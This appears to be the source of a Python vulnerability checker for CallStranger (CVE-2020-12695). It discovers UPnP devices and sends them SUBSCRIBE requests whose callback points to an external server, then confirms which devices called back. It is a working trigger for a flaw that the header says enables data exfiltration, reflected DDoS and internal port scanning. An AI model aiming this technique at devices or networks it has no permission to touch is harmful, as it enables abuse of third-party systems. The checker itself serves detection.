import os
import sys, getopt
import upnpy
import requests
import uuid
import socket
import cryptography
import time

from cryptography.fernet import Fernet
from sys import platform
from termcolor import colored, cprint

from helpers import *

if sys.platform == "win32":
    os.system("color")

logo = (
    "_________        .__  .__    _________ __                                              \n"
    "\_   ___ \_____  |  | |  |  /   _____//  |_____________    ____    ____   ___________  \n"
    "/    \  \/\__  \ |  | |  |  \_____  \\   __\_  __ \__  \  /    \  / ___\_/ __ \_  __ \ \n"
    "\     \____/ __ \|  |_|  |__/        \|  |  |  | \// __ \|   |  \/ /_/  >  ___/|  | \/ \n"
    " \______  (____  /____/____/_______  /|__|  |__|  (____  /___|  /\___  / \___  >__|    \n"
    "        \/     \/                  \/                  \/     \//_____/      \/        "
)

header = (
    "This script created by Yunus Çadırcı (https://twitter.com/yunuscadirci, to check against CallStranger (CVE-2020-12695) vulnerability. An attacker can use this vulnerability for:"
    "* Bypassing DLP for exfiltrating data",
    "* Using millions of Internet-facing UPnP device as source of amplified reflected TCP DDoS / SYN Flood",
    "* Scanning internal ports from Internet facing UPnP devices",
    "You can find detailed information on https://www.callstranger.com  https://kb.cert.org/vuls/id/339275 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12695",
    "Slightly modified version of https://github.com/5kyc0d3r/upnpy used for base UPnP communication",
)

printgreen(logo)
print(header)


def subscribe(URL, callbackURL):
    myheaders = {
        "User-Agent": "Callstranger Vulnerability Checker",
        "CALLBACK": f"<{callbackURL}>",
        "NT": "upnp:event",
        "TIMEOUT": "Second-300",
    }
    # print(URL,callbackURL,'sending')
    req = requests.request("SUBSCRIBE", URL, headers=myheaders)
    if req.status_code == 200:
        printgreen(f"Subscribe to {URL} seems successful")
        print(req.headers)
        print(req.text)
    else:
        printred(f"Subscribe to {URL} failed with status code: {req.status_code}")
        print(req.headers)
        print(req.text)


def getsession(path):
    session = ""
    try:
        getses = requests.request("PUT", path)
        session = getses.text
        printgreen(f"Successfully get session: {session}")
    except:
        printred(f"Could not  contact server {path} for vulnerability confirmation")
    return session


def confirmvulnerableservices(path, key):
    vulnerableservices = ""
    try:
        getservices = requests.request("PUT", path)
        vulnerableservices = getservices.text
        printgreen("Successfully get services from server: " + path)
        print()
        print("Encrypted vulnerable services:")
        print(vulnerableservices)
        print()
        print("Decyripting vulnerable services with key:", key)
        fk = Fernet(key)
        i = 1
        decryptedvulnerableservices = []
        printred("\nVerified vulnerable services: ")
        for line in vulnerableservices.splitlines():
            data = fk.decrypt(line.encode()).decode()
            printred(f"{i}:\t{data}")
            decryptedvulnerableservices.append(data)
            i += 1

        unverifiedservices = Diff(services, decryptedvulnerableservices)

        printyellow("\nUnverified  services: ")
        i = 1
        for unverifiedservice in unverifiedservices:
            printyellow(f"{i}:\t{unverifiedservice}")
            i += 1
    except:
        printred(
            f"Could not get services from server {path} for vulnerability confirmation"
        )


def Diff(li1, li2):
    li_dif = [i for i in li1 + li2 if i not in li1 or i not in li2]
    return li_dif


services = []
serviceeventSubURLs = []
dummyservicekeywords = ["dummy", "notfound"]
# this host must be external so you can be sure that devices are vulnerable. Most of UPnP stacks don't allow hostname. use IP if possible
StrangerHost = "http://" + socket.gethostbyname("verify.callstranger.com")
StrangerPort = "80"
getSessionPath = "/CallStranger.php?c=getsession"
putServicePath = "/CallStranger.php?c=addservice&service="  # this HTTP request verb is NOTIFY , your web server must respond to NOTIFY
getVulnerableServicesPath = "/CallStranger.php?c=getservices"
print("Stranger Host:", StrangerHost)
print("Stranger Port:", StrangerPort)

upnp = upnpy.UPnP()

# Discover UPnP devices on the network

devices = upnp.discover()
if len(devices) > 0:
    print(colored(len(devices), "blue"), colored(" devices found:", "blue"))

    for device in devices:
        print(
            "\n",
            colored(device.friendly_name, "yellow"),
            device.base_url,
            "(",
            device.document_location,
            ")",
        )
        tmpservices = device.get_services()
        print()
        printyellow(f"{len(tmpservices)} service(s) found for {device.friendly_name}")
        for tmpservice in tmpservices:
            print(
                f"\t{tmpservice.service}   --> {device.base_url}{tmpservice.event_sub_url}"
            )
            if any(x in tmpservice.event_sub_url for x in dummyservicekeywords):
                print(
                    f"     --skipping {device.base_url}{tmpservice.event_sub_url} "
                    "because it contains dummy service keywords",
                )
            else:
                services.append(device.base_url + tmpservice.event_sub_url)

    print()
    print(
        f"Total {len(services)} service(s) found. do you want to continue to VERIFY if service(s) are vulnerable?"
    )
    printred(
        "Be careful: This operation needs Internet access and may transfer data about devices over network. Data encrypted on local and we can not see which services are vulnerable but ISPs and other elements may be able to inspect HTTP headers created by UPnP device. Because most of UPnP stack do not allow SSL connection we can not use it. "
    )
    if input("Do you want to continue? y/N ") == "y":

        ss = getsession(StrangerHost + ":" + StrangerPort + getSessionPath)
        key = Fernet.generate_key()
        fk = Fernet(key)
        print(
            f"Symmetric random key for encryption: {key}. ",
            "We do not send this value to server so we can not see which services are vulnerable. All confirmation process is done on client side",
        )
        for serv in services:
            data = fk.encrypt(serv.encode()).decode()
            path = f"{StrangerHost}:{StrangerPort}{putServicePath}{data}&token={ss}"
            print(f"Calling stranger for {serv} with {path}")
            subscribe(serv, path)

        printyellow("\n	Waiting 5 second for asynchronous requests")
        time.sleep(5)
        vulnerabilityconfirmationpath = (
            f"{StrangerHost}:{StrangerPort}{getVulnerableServicesPath}&token={ss}"
        )
        confirmvulnerableservices(vulnerabilityconfirmationpath, key)


else:
    printyellow("No UPnP device found. Possible reasons: ")
    printyellow("* You just connected to network.")
    printyellow("* UPnP stack is too slow. Restart this script")
    printyellow("* UPnP is disabled on OS.")
    printyellow("* UPnP is disabled on devices.")
    printyellow("* There is no UPnP supported device.")
    printyellow("* Your OS works on VM with NAT configuration.")

print()
print("\tVisit https://www.CallStranger.com for updates")
